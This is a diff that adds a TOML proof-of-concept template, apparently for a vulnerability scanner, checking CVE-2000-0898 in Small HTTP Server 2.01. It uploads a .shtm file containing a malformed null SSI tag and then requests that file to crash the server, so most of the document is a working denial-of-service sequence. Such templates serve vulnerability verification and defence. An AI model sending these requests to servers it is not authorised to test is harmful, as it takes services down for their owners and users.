@@ -1,0 +1,59 @@
+[info]
+author = "AVE"
+description = "Small HTTP Server 2.01 在处理包含空值的 SSI 标签时崩溃。通过 PUT 上传包含恶意 SSI 标签的 .shtm 文件，再 GET 请求触发解析，验证服务器是否崩溃导致拒绝服务。"
+id = "POC-AVE-2000-1001"
+name = "Small HTTP Server Null SSI Tag DoS PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0898",
+    "small-http-server",
+    "ssi",
+    "dos",
+]
+vuln_id = [
+    "CVE-2000-0898",
+    "AVE-2000-1001",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PUT"
+path = "/{{BaseURL}}/poc-test.shtm"
+protocol = "http"
+
+[poc.requests.body]
+content = "<html><!--#printenv= --></html>"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/html"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+    204,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc-test.shtm"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "refused",
+    "timeout",
+    "Connection refused",
+]
